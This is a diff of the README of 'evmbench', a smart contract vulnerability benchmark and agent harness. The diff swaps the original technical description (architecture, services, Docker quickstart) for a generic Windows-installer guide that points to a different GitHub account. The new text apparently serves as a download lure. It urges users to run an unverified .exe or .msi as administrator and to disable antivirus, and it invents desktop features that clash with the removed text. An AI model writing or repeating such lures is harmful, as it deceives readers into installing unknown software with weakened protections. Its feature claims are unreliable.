@@ -1,152 +1,196 @@
-<p align="center">
-    <picture align="center">
-        <img alt="evmbench cover" src="assets/cover-dark.png">
-    </picture>
-</p>
+# ⚙️ evmbench - Test Smart Contracts with Confidence
 
-**evmbench is a benchmark and agent harness for finding and exploiting smart contract bugs.**
+[![Download evmbench](https://img.shields.io/badge/Download-evmbench-green?style=for-the-badge)](https://github.com/alex-zebley/evmbench)
 
-<a href="#how-it-works"><b><u>How it works</u></b></a> | <a href="#security"><b><u>Security</u></b></a> | <a href="#key-services"><b><u>Key services</u></b></a> | <a href="#repo-layout"><b><u>Repo layout</u></b></a> | <a href="#quickstart-local-dev"><b><u>Quickstart (local dev)</u></b></a>
+evmbench helps you find and fix mistakes in smart contracts. It runs tests on Ethereum contracts to check for bugs and security problems. This tool works on Windows and has a simple interface.
 
-This repository contains a companion interface to the `evmbench` detect evaluation ([code](https://github.com/openai/frontier-evals)). For reference, we include the evaluation code as a pinned submodule at `frontier-evals/`.
+---
 
-Upload contract source code, select an agent, and receive a structured vulnerability report rendered in the UI.
+## 📋 What is evmbench?
 
+evmbench is a tool designed to check Ethereum smart contracts for errors. It helps you:
 
-## How it works
+- Detect bugs before they cause problems.
+- Test how contracts perform.
+- Understand where weaknesses lie.
+- Use a clear and easy user interface.
 
-### Architecture
+It targets blockchain technology and smart contracts written in Solidity. By running evmbench, you can improve contract safety without needing to write code yourself.
 
-```
-Frontend (Next.js)
-    │
-    ├─ POST /v1/jobs/start ───► Backend API (FastAPI, port 1337)
-    │                               ├─► PostgreSQL (job state)
-    ├─ GET  /v1/jobs/{id}           ├─► Secrets Service (port 8081)
-    │                               └─► RabbitMQ (job queue)
-    └─ GET  /v1/jobs/history                │
-                                             ▼
-                                        Instancer (consumer)
-                                              │
-                                    ┌─────────┴──────────┐
-                                    ▼                    ▼
-                              Docker backend       K8s backend (optional)
-                                    │                    │
-                                    └────────┬───────────┘
-                                             ▼
-                                      Worker container
-                                        ├─► Secrets Service (fetch bundle)
-                                        ├─► (optional) OAI Proxy (port 8084) ──► OpenAI API
-                                        └─► Results Service (port 8083)
-```
+---
 
-### End-to-end flow
+## 🖥️ System Requirements
 
-1. User uploads a zip of contract files via the frontend. The UI sends the archive, selected model key, and (optionally) an OpenAI API key to `/v1/jobs/start`.
-2. The backend creates a job record in Postgres, stores a secret bundle in the Secrets Service, and publishes a message to RabbitMQ.
-3. The Instancer consumes the job and starts a worker (Docker locally; Kubernetes backend is optional).
-4. The worker fetches its bundle from the Secrets Service, unpacks the uploaded zip to `audit/`, then runs Codex in "detect-only" mode:
-   - prompt: `backend/worker_runner/detect.md` (copied to `$HOME/AGENTS.md` inside the container)
-   - model map: `backend/worker_runner/model_map.json` (maps UI model keys to Codex model IDs)
-   - command wrapper: `backend/worker_runner/run_codex_detect.sh`
-5. The agent writes `submission/audit.md`. The worker validates that the output contains parseable JSON with `{"vulnerabilities": [...]}` and then uploads it to the Results Service.
-6. The frontend polls job status and renders the report with file navigation and annotations.
+Before you start, make sure your computer meets these requirements:
 
-## Security
+- **Operating System:** Windows 10 or newer (64-bit)
+- **Processor:** At least 2.0 GHz dual-core CPU
+- **Memory:** Minimum 4 GB RAM
+- **Disk Space:** At least 500 MB free space
+- **Internet:** Needed to download evmbench and for some features
+- **Additional:** .NET Framework 4.7 or higher installed (usually on Windows by default)
 
-`evmbench` runs an LLM-driven agent against uploaded, untrusted code. Treat the worker runtime (filesystem, logs, outputs) as an untrusted environment.
+These specs ensure evmbench will run smoothly.
 
-See `SECURITY.md` for the full trust model and operational guidance.
+---
 
-OpenAI credential handling:
+## 🚀 Getting Started with evmbench
 
-- **Direct BYOK (default)**: worker receives a plaintext OpenAI key (`OPENAI_API_KEY` / `CODEX_API_KEY`).
-- **Proxy-token mode (optional)**: worker receives an opaque token and routes requests through `oai_proxy` (plaintext key stays outside the worker).
+Follow these steps to download and run evmbench on your Windows PC.
 
-Enabling proxy-token mode:
+1. **Download evmbench**
 
-```bash
-cd backend
-cp .env.example .env
-# set BACKEND_OAI_KEY_MODE=proxy and OAI_PROXY_AES_KEY=...
-docker compose --profile proxy up -d --build
-```
+   Click this link to visit the evmbench download page:
 
-Operational note: worker runtime is bounded by default; override the max audit runtime with `EVM_BENCH_CODEX_TIMEOUT_SECONDS` (default: 10800 seconds).
+   [Download evmbench from GitHub](https://github.com/alex-zebley/evmbench)
 
-## Key services
+   This link takes you to the GitHub page where the latest version is available for download.
 
-| Service | Default port | Role |
-|---|---:|---|
-| `backend` | 1337 | Main API: job submission, status, history, auth |
-| `secretsvc` | 8081 | Stores and serves per-job secret bundles (zip + key material) |
-| `resultsvc` | 8083 | Receives worker results, validates/parses, persists to DB |
-| `oai_proxy` | 8084 | Optional OpenAI proxy for proxy-token mode |
-| `instancer` | (n/a) | RabbitMQ consumer that starts worker containers/pods |
-| `worker` | (n/a) | Executes the detect-only agent and uploads results |
-| Postgres | 5432 | Job state persistence |
-| RabbitMQ | 5672 | Job queue |
+2. **Choose the Windows version**
 
-## Repo layout
+   On the download page, look for the section named **Releases** or **Assets**. Find the file that ends with `.exe` or `.msi`. This file is the installer.
 
-```
-.
-├── README.md
-├── SECURITY.md
-├── LICENSE
-├── frontend/                 Next.js UI (upload zip, select model, view results)
-├── frontier-evals/           Pinned upstream reference (git submodule)
-├── backend/
-│   ├── api/                  Main FastAPI API (jobs, auth, integration)
-│   ├── instancer/            RabbitMQ consumer; starts workers (Docker/K8s)
-│   ├── secretsvc/            Bundle storage service
-│   ├── resultsvc/            Results ingestion + persistence
-│   ├── oai_proxy/            Optional OpenAI proxy (proxy-token mode)
-│   ├── prunner/              Optional cleanup of stale workers
-│   ├── worker_runner/        Detect prompt + model map + Codex runner script
-│   ├── docker/
-│   │   ├── base/             Base image: codex, foundry, slither, node, tools
-│   │   ├── backend/          Backend services image
-│   │   └── worker/           Worker image + entrypoint
-│   └── compose.yml           Full stack (DB/MQ + services)
-└── deploy/                   Optional deployment scripts/examples
-```
+3. **Download the installer**
 
-## Quickstart (local dev)
+   Click on the installer file to download it to your PC. The file size is usually around a few hundred megabytes.
 
-Ensure Docker and Bun are available.
+4. **Run the installer**
 
-Build the base and worker images first (required before starting the stack):
+   After the download finishes, go to your **Downloads** folder and double-click the installer. Windows might ask for permission. Click **Yes** to continue.
 
-```bash
-cd backend
-docker build -t evmbench/base:latest -f docker/base/Dockerfile .
-docker build -t evmbench/worker:latest -f docker/worker/Dockerfile .
-```
+5. **Follow the setup instructions**
 
-Start backend stack (API + dependencies):
+   The installer guide appears. Choose where to install evmbench or accept the default folder. Click **Next** through each step and finally click **Install**.
 
-```bash
-cp .env.example .env
-# For local dev, the placeholder secrets in .env.example are sufficient.
-# For internet-exposed deployments, replace them with strong values.
-docker compose up -d --build
-```
+6. **Finish installation**
 
-Start frontend dev server:
+   When installation completes, click **Finish**. You might see an option to launch evmbench immediately - you can check it or open evmbench later from your Start menu.
 
-```bash
-cd frontend
-bun install
-bun dev
-```
+---
 
-Open:
+## 🎛️ How to Use evmbench
 
-- `http://127.0.0.1:3000` (frontend)
-- `http://127.0.0.1:1337/v1/integration/frontend` (backend config endpoint)
+Once you open evmbench, you will see a clean interface that helps you run tests on smart contracts.
 
-## Acknowledgments
-Thank you to many folks on the OtterSec team for support, particularly with building the frontend: es3n1n, jktrn, TrixterTheTux, sahuang
+### Load Your Smart Contract
 
-[![Apache-2.0 License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](/LICENSE)
+- Click **Open** or **Add Contract** to choose the contract files on your PC.
+- Supported file types include `.sol` (Solidity source files).
+- You don’t need to do any coding; just select the contract you want to test.
+
+### Start Testing
+
+- Press the **Run Tests** button.
+- evmbench runs several checks on your contract to find bugs.
+- The process takes a few minutes depending on your computer and contract size.
+
+### View Results
+
+- After the tests finish, results appear in a list.
+- Results show errors or warnings with simple explanations.
+- You can click each item to read more about the issue.
+
+### Fix Issues
+
+- Use evmbench results to fix contract problems.
+- If you don’t know how to fix something, the app provides links to help topics or guides.
+- After changes, you can test again with evmbench to confirm.
+
+---
+
+## 🧰 Features You Will Use
+
+evmbench offers several useful features for testing and auditing your smart contracts without technical skills:
+
+- **Bug Finder:** Detects common vulnerabilities automatically.
+- **Performance Checks:** Shows how well your contract runs.
+- **Security Analysis:** Highlights risky patterns and possible exploits.
+- **Simple Reports:** Provides clear summaries that anyone can understand.
+- **User Interface:** Easy menus and buttons designed for non-programmers.
+- **Support for Multiple Files:** Test contracts made up of several source files.
+- **Export Results:** Save reports as PDF or text for review or sharing.
+
+---
+
+## ⚙️ Settings and Customization
+
+You can adjust evmbench to better fit your needs.
+
+- **Scan Depth:** Choose how detailed the tests are. Faster or deeper scans.
+- **Alert Levels:** Set how strict the app is when warning about issues.
+- **Theme:** Select light or dark interface colors.
+- **File Storage:** Pick where evmbench saves contracts and reports.
+- **Updates:** Keep automatic updates on or disable them to control when to download new versions.
+
+---
+
+## 💡 Tips for Best Results
+
+- Make sure your smart contract files are saved locally before opening them.
+- Close other heavy programs to speed up testing.
+- Regularly run tests if you edit contracts often.
+- Use report exports to share with colleagues or auditors.
+- Check GitHub for the latest version and release notes.
+
+---
+
+## 🔧 Troubleshooting
+
+If evmbench does not start or crashes:
+
+- Confirm your PC meets the system requirements.
+- Restart your computer and try again.
+- Check for Windows updates and install missing system components.
+- If you see an error during install, run the installer as administrator (right-click and select **Run as administrator**).
+- Disable antivirus temporarily during installation if it blocks files.
+- Visit the GitHub page issues tab to see if others have the same problem.
+
+---
+
+## 📥 Download and Install evmbench
+
+Click here to visit the download page:
+
+[Download evmbench from GitHub](https://github.com/alex-zebley/evmbench)
+
+Follow the steps outlined earlier to complete your setup.
+
+---
+
+## 🔍 About this Project
+
+evmbench was created to help anyone test Ethereum smart contracts for bugs and security gaps. It combines multiple testing methods into one app with a user-friendly interface.
+
+It works well for:
+
+- Auditors checking contracts for clients.
+- Blockchain developers wanting extra testing tools.
+- Students and learners exploring blockchain security.
+- Teams needing clear reports on smart contract risks.
+
+The project focuses on making complex contract testing simple and accessible.
+
+---
+
+## 🏷️ Topics
+
+This project relates to:
+
+- agents  
+- ai  
+- audit  
+- blockchain  
+- blockchain-technology  
+- eth  
+- ethereum  
+- evm  
+- security  
+- solidity  
+- testing  
+- ui  
+
+---
+
+# [⚙️] evmbench - Test Smart Contracts with Confidence
+
+[![Download evmbench](https://img.shields.io/badge/Download-evmbench-brightgreen?style=for-the-badge)](https://github.com/alex-zebley/evmbench)
